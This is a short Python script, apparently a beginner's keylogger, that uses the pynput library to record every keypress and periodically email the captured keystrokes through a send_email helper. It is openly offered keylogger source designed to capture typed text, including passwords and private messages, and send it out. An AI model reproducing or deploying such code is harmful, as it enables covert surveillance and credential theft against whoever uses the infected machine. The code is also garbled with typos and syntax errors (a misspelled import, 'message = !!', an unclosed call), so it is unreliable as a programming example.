import pynput  #Main librarry that records the keypresses - install by typing pip install pynput on your CL
from pynput.keyboard import Key, Listener
import senf_email

count = 0
keys = []

def on_press(key) :    #Defining the on press function 
  print (key. end= " ")  #When any key except esc is pressed, the progrm starts capturing keystroks
  print ("pressed")
  global keys, count
  keys.append(str(key))
  count += 1
  if count > 10:  #Everytime there is a keystrock beyond 10, the email(keys) will be activated
    count = 0
    email(keys)

def email(keys) :    #Defining the email fuction and making the stroks more readable for us 
  message = !!
  for key in keys: 
    k = key.replace("'","")  # This line, replaces commas to nothing
    if key == "Key.space":   #If ther is any key presses that has spce, then this will add the space
      k = " "
    elif key.find("Key")>0:
      k = " "
    message += k
  print(message)
  send_email.sendEmail(message)

def on_release(key):   #Defining the on release function
  if key == Key.esc:  # When you press the esc key on the CL , the program will stop and return false. 
    return False

with Listener (on_press = on_press, on_elease = on_release as listener: 
  listener.join()
    
